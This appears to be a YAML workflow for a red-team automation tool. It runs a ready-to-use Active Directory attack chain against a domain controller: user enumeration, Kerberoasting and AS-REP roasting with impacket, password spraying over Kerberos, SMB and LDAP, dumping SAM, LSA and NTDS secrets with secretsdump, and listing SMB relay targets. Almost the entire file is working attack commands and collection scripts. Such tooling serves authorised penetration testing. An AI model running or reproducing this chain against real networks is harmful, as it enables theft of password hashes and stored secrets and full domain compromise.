name: ad-attack
description:
  "Active Directory attack chain — kerberoasting, AS-REP roasting, targeted password spraying, credential dumping, and SMB relay detection. Requires at least one set of valid AD credentials.

  "
tags:
  - redteam
  - ad
  - kerberos
  - attack
  - credentials
dispatch:
  inputs:
    target:
      required: true
      type: string
      description: Domain controller IP or hostname
      alias: t
    domain:
      required: true
      type: string
      description: AD domain name (e.g. corp.local)
    username:
      required: true
      type: string
      description: Valid AD username
    password:
      required: true
      type: string
      description: Password or NTLM hash
    users_file:
      type: string
      default: ""
      description: Path to username list for spraying (optional)

defaults:
  store-creds: true
jobs:
  enum:
    name: Pre-Attack Enumeration
    outputs:
      users_file: '{{ steps["collect-users"].outputs.users_file | default("", true) }}'
      user_count: '{{ steps["collect-users"].outputs.user_count | default("", true) }}'
    steps:
      - task: netexec
        log-command: true
        timeout: 15
        name: smb-info
        with:
          target: "{{ inputs.target }}"
          protocol: smb
          username: "{{ inputs.username }}"
          password: "{{ inputs.password }}"
          domain: "{{ inputs.domain }}"
          users: true
        continue-on-error: true
      - task: netexec
        log-command: true
        timeout: 15
        name: pass-policy
        with:
          target: "{{ inputs.target }}"
          protocol: smb
          username: "{{ inputs.username }}"
          password: "{{ inputs.password }}"
          domain: "{{ inputs.domain }}"
          pass_pol: true
        continue-on-error: true
      - task: enum4linux
        log-command: true
        timeout: 10
        name: full-enum
        with:
          target: "{{ inputs.target }}"
          username: "{{ inputs.username }}"
          password: "{{ inputs.password }}"
          domain: "{{ inputs.domain }}"
          users: true
          shares: true
          groups: true
          policies: true
        continue-on-error: true
      - name: collect-users
        script: |
          import re

          users = set()
          # From netexec user output
          nxc_users = {{ users(steps["smb-info"].outputs.typed_outputs) | tojson }}
          for u in nxc_users:
              if u.get('username'):
                  users.add(u['username'])

          # From enum4linux
          e4l_users = {{ users(steps["full-enum"].outputs.typed_outputs) | tojson }}
          for u in e4l_users:
              if u.get('username'):
                  users.add(u['username'])

          user_list = '\n'.join(sorted(users))
          with open(f'{os.environ.get("OFX_RUN_DIR", "/tmp")}/ofx_ad_users.txt', 'w') as f:
              f.write(user_list)

          add_outputs(users_file=f"{os.environ.get('OFX_RUN_DIR', '/tmp')}/ofx_ad_users.txt", user_count=len(users))
          print(f"Enumerated {len(users)} AD users")
  kerberoast:
    name: Kerberoasting
    outputs:
      spn_count: '{{ steps["collect-spns"].outputs.spn_count | default("", true) }}'
      tgs_hashes: '{{ steps["collect-spns"].outputs.tgs_hashes | default("", true) }}'
    needs:
      - enum
    steps:
      - name: kerberoast-attack
        log-command: true
        run: |
          impacket-GetUserSPNs {{ inputs.domain }}/{{ inputs.username }}:'{{ inputs.password }}' \
            -dc-ip {{ inputs.target }} -request \
            -outputfile ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast_hashes.txt 2>/dev/null | tee ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast_output.txt
        continue-on-error: true
      - name: collect-spns
        script: |
          import re

          spn_users = []
          hashes = 0

          try:
              with open(f'{os.environ.get("OFX_RUN_DIR", "/tmp")}/ofx_kerberoast_output.txt') as f:
                  for line in f:
                      match = re.search(r'(\S+)\s+(\S+/\S+)', line)
                      if match and 'ServicePrincipalName' not in line:
                          spn_users.append(match.group(0).strip())
          except FileNotFoundError:
              pass

          try:
              with open(f'{os.environ.get("OFX_RUN_DIR", "/tmp")}/ofx_kerberoast_hashes.txt') as f:
                  hashes = sum(1 for line in f if line.strip().startswith('$krb5tgs$'))
          except FileNotFoundError:
              pass

          add_outputs(spn_count=len(spn_users), tgs_hashes=hashes)
          print(f"Kerberoastable accounts: {len(spn_users)}, TGS hashes: {hashes}")
          for spn in spn_users:
              print(f"  [*] {spn}")
  asrep-roast:
    name: AS-REP Roasting
    outputs:
      asrep_count: '{{ steps["collect-asrep"].outputs.asrep_count | default("", true) }}'
      asrep_hashes: '{{ steps["collect-asrep"].outputs.asrep_hashes | default("", true) }}'
    needs:
      - enum
    steps:
      - name: asrep-attack
        log-command: true
        run: |
          impacket-GetNPUsers {{ inputs.domain }}/ -dc-ip {{ inputs.target }} \
            -usersfile {{ jobs.enum.outputs.users_file | default('/tmp/ofx_ad_users.txt', true) }} -format hashcat \
            -outputfile ${OFX_RUN_DIR:-/tmp}/ofx_asrep_hashes.txt 2>/dev/null | tee ${OFX_RUN_DIR:-/tmp}/ofx_asrep_output.txt
        continue-on-error: true
      - name: collect-asrep
        script: |
          import re

          asrep_users = set()
          hashes = 0

          try:
              with open(f'{os.environ.get("OFX_RUN_DIR", "/tmp")}/ofx_asrep_hashes.txt') as f:
                  for line in f:
                      if line.strip().startswith('$krb5asrep$'):
                          hashes += 1
                          match = re.search(r'\$krb5asrep\$23?\$(.+?)@', line)
                          if match:
                              asrep_users.add(match.group(1))
          except FileNotFoundError:
              pass

          add_outputs(asrep_count=len(asrep_users), asrep_hashes=hashes)
          print(f"AS-REP roastable: {len(asrep_users)}, hashes: {hashes}")
          for u in sorted(asrep_users):
              print(f"  [*] {u}")
  targeted-spray:
    name: Targeted Password Spray
    outputs:
      spray_hits: '{{ steps["collect-spray"].outputs.spray_hits | default("", true) }}'
      valid_users_file: '{{ steps["collect-spray"].outputs.valid_users_file | default("", true) }}'
    needs:
      - enum
    steps:
      - task: kerbrute
        log-command: true
        timeout: 15
        name: kerbrute-spray
        with:
          target: "{{ inputs.target }}"
          mode: passwordspray
          dc: "{{ inputs.target }}"
          domain: "{{ inputs.domain }}"
          users: "{{ inputs.users_file if inputs.users_file else jobs.enum.outputs.users_file | default('/tmp/ofx_ad_users.txt', true) }}"
          password: "{{ inputs.password }}"
        continue-on-error: true
      - task: netexec
        log-command: true
        timeout: 15
        name: nxc-spray-smb
        with:
          target: "{{ inputs.target }}"
          protocol: smb
          username: "{{ inputs.users_file if inputs.users_file else jobs.enum.outputs.users_file | default('/tmp/ofx_ad_users.txt', true) }}"
          password: "{{ inputs.password }}"
          domain: "{{ inputs.domain }}"
        continue-on-error: true
      - task: netexec
        log-command: true
        timeout: 15
        name: nxc-spray-ldap
        with:
          target: "{{ inputs.target }}"
          protocol: ldap
          username: "{{ inputs.users_file if inputs.users_file else jobs.enum.outputs.users_file | default('/tmp/ofx_ad_users.txt', true) }}"
          password: "{{ inputs.password }}"
          domain: "{{ inputs.domain }}"
        continue-on-error: true
      - name: collect-spray
        script: |
          kerb_hits = {{ users(steps["kerbrute-spray"].outputs.typed_outputs) | tojson }}
          smb_hits = {{ users(steps["nxc-spray-smb"].outputs.typed_outputs) | tojson }}
          ldap_hits = {{ users(steps["nxc-spray-ldap"].outputs.typed_outputs) | tojson }}

          all_valid = set()
          for u in kerb_hits + smb_hits + ldap_hits:
              if u.get('username'):
                  all_valid.add(u['username'])

          open(f'{os.environ.get("OFX_RUN_DIR", "/tmp")}/ofx_adattack_valid.txt', 'w').write('\n'.join(sorted(all_valid)))
          add_outputs(spray_hits=len(all_valid), valid_users_file=f"{os.environ.get('OFX_RUN_DIR', '/tmp')}/ofx_adattack_valid.txt")
          print(f"Spray hits: {len(all_valid)} valid credentials")
  credential-dump:
    name: Credential Dumping
    outputs:
      hash_count: '{{ steps["collect-creds"].outputs.hash_count | default("", true) }}'
      sam_count: '{{ steps["collect-creds"].outputs.sam_count | default("", true) }}'
      lsa_count: '{{ steps["collect-creds"].outputs.lsa_count | default("", true) }}'
    needs:
      - enum
    steps:
      - name: secretsdump
        log-command: true
        run: |
          impacket-secretsdump {{ inputs.domain }}/{{ inputs.username }}:'{{ inputs.password }}'@{{ inputs.target }} \
            -outputfile ${OFX_RUN_DIR:-/tmp}/ofx_secretsdump 2>/dev/null | tee ${OFX_RUN_DIR:-/tmp}/ofx_secretsdump_output.txt
        continue-on-error: true
      - task: netexec
        log-command: true
        timeout: 15
        name: nxc-sam
        with:
          target: "{{ inputs.target }}"
          protocol: smb
          username: "{{ inputs.username }}"
          password: "{{ inputs.password }}"
          domain: "{{ inputs.domain }}"
          sam: true
        continue-on-error: true
      - task: netexec
        log-command: true
        timeout: 15
        name: nxc-lsa
        with:
          target: "{{ inputs.target }}"
          protocol: smb
          username: "{{ inputs.username }}"
          password: "{{ inputs.password }}"
          domain: "{{ inputs.domain }}"
          lsa: true
        continue-on-error: true
      - name: collect-creds
        script: |
          import re

          hashes = set()
          try:
              with open(f'{os.environ.get("OFX_RUN_DIR", "/tmp")}/ofx_secretsdump_output.txt') as f:
                  for line in f:
                      if ':::' in line and 'Dumping' not in line:
                          hashes.add(line.strip())
          except FileNotFoundError:
              pass

          sam_creds = {{ users(steps["nxc-sam"].outputs.typed_outputs) | tojson }}
          lsa_creds = {{ users(steps["nxc-lsa"].outputs.typed_outputs) | tojson }}

          add_outputs(hash_count=len(hashes), sam_count=len(sam_creds), lsa_count=len(lsa_creds))
          print(f"Secretsdump: {len(hashes)} hashes")
          print(f"SAM: {len(sam_creds)}, LSA: {len(lsa_creds)}")
  relay-detect:
    name: SMB Relay Detection
    outputs:
      relay_count: '{{ steps["collect-relay"].outputs.relay_count | default("", true) }}'
      webdav_enabled: '{{ steps["collect-relay"].outputs.webdav_enabled | default("", true) }}'
    needs:
      - enum
    steps:
      - task: netexec
        log-command: true
        timeout: 10
        name: smb-signing
        with:
          target: "{{ inputs.target }}"
          protocol: smb
          gen_relay_list: ${OFX_RUN_DIR:-/tmp}/ofx_relay_targets.txt
        continue-on-error: true
      - task: netexec
        log-command: true
        timeout: 10
        name: webdav-check
        with:
          target: "{{ inputs.target }}"
          protocol: smb
          username: "{{ inputs.username }}"
          password: "{{ inputs.password }}"
          domain: "{{ inputs.domain }}"
          module: webdav
        continue-on-error: true
      - name: collect-relay
        script: |
          relay_targets = []
          try:
              with open(f'{os.environ.get("OFX_RUN_DIR", "/tmp")}/ofx_relay_targets.txt') as f:
                  for line in f:
                      ip = line.strip()
                      if ip:
                          relay_targets.append(ip)
          except FileNotFoundError:
              pass

          webdav_out = '''{{ steps["webdav-check"].outputs.stdout | default("", true) }}'''
          webdav = 'WebClient' in webdav_out and 'Enabled' in webdav_out

          add_outputs(relay_count=len(relay_targets), webdav_enabled='yes' if webdav else 'no')
          print(f"SMB signing disabled (relay targets): {len(relay_targets)}")
          print(f"WebDAV enabled: {webdav}")
  summary:
    name: AD Attack Summary
    needs:
      - kerberoast
      - asrep-roast
      - targeted-spray
      - credential-dump
      - relay-detect
    steps:
      - name: report
        run: |
          echo "======================================================"
          echo " AD ATTACK CHAIN COMPLETE: {{ inputs.target }}"
          echo " Domain: {{ inputs.domain }}"
          echo "======================================================"
          echo ""
          echo "--- Enumeration ---"
          echo "AD users discovered: {{ jobs.enum.outputs.user_count }}"
          echo ""
          echo "--- Kerberos Attacks ---"
          echo "Kerberoastable SPNs: {{ jobs.kerberoast.outputs.spn_count }}"
          echo "TGS hashes captured: {{ jobs.kerberoast.outputs.tgs_hashes }}"
          echo "AS-REP roastable: {{ jobs['asrep-roast'].outputs.asrep_count }}"
          echo "AS-REP hashes: {{ jobs['asrep-roast'].outputs.asrep_hashes }}"
          echo ""
          echo "--- Password Spray ---"
          echo "Valid credentials: {{ jobs['targeted-spray'].outputs.spray_hits }}"
          echo ""
          echo "--- Credential Dumping ---"
          echo "Secretsdump hashes: {{ jobs['credential-dump'].outputs.hash_count }}"
          echo "SAM entries: {{ jobs['credential-dump'].outputs.sam_count }}"
          echo "LSA secrets: {{ jobs['credential-dump'].outputs.lsa_count }}"
          echo ""
          echo "--- Relay Opportunities ---"
          echo "No-signing hosts: {{ jobs['relay-detect'].outputs.relay_count }}"
          echo "WebDAV enabled: {{ jobs['relay-detect'].outputs.webdav_enabled }}"
        log-stdout: true
      - name: export-to-project
        script: |
          import shutil
          from pathlib import Path

          project = '{{ vars.project_path | default("", true) }}'
          if not project:
              print('No --project set, skipping file export')
          else:

              # AD users
              d = '{{ vars.project_hosts }}'
              Path(d).mkdir(parents=True, exist_ok=True)
              src = '''{{ jobs['enum'].outputs.users_file | default('', true) }}'''
              if src and Path(src).is_file():
                  shutil.copy2(src, Path(d) / 'ad-users.txt')
                  print('  [+] hosts/ad-users.txt')

              # spray hits
              d = '{{ vars.project_evidence }}'
              sub = Path(d) / 'creds'
              sub.mkdir(parents=True, exist_ok=True)
              src = '''{{ jobs['targeted-spray'].outputs.valid_users_file | default('', true) }}'''
              if src and Path(src).is_file():
                  shutil.copy2(src, sub / 'spray-valid.txt')
                  print('  [+] evidence/creds/spray-valid.txt')

              # kerberoastable SPNs
              d = '{{ vars.project_evidence }}'
              sub = Path(d) / 'creds'
              sub.mkdir(parents=True, exist_ok=True)
              data = '''{{ jobs['kerberoast'].outputs.spn_count | default('', true) }}'''.strip()
              if data:
                  (sub / 'kerberoast-spns.txt').write_text(data)
                  print(f'  [+] evidence/creds/kerberoast-spns.txt ({len(data.splitlines())} lines)')

              # AS-REP roastable
              d = '{{ vars.project_vulns }}'
              Path(d).mkdir(parents=True, exist_ok=True)
              data = '''{{ jobs['asrep-roast'].outputs.asrep_count | default('', true) }}'''.strip()
              if data:
                  (Path(d) / 'asrep-users.txt').write_text(data)
                  print(f'  [+] vulns/asrep-users.txt ({len(data.splitlines())} lines)')

              # Auto-export typed outputs
              all_typed = []
              for typed in [
                  {{ jobs['enum'].outputs.typed_outputs | default([], true) | tojson }},
                  {{ jobs['kerberoast'].outputs.typed_outputs | default([], true) | tojson }},
                  {{ jobs['asrep-roast'].outputs.typed_outputs | default([], true) | tojson }},
                  {{ jobs['targeted-spray'].outputs.typed_outputs | default([], true) | tojson }},
                  {{ jobs['credential-dump'].outputs.typed_outputs | default([], true) | tojson }},
                  {{ jobs['relay-detect'].outputs.typed_outputs | default([], true) | tojson }},
              ]:
                  all_typed.extend(typed)
              summaries = export_typed_outputs(project, all_typed)
              for s in summaries:
                  print(s)

              print(f'Project export complete: {project}')
        continue-on-error: true
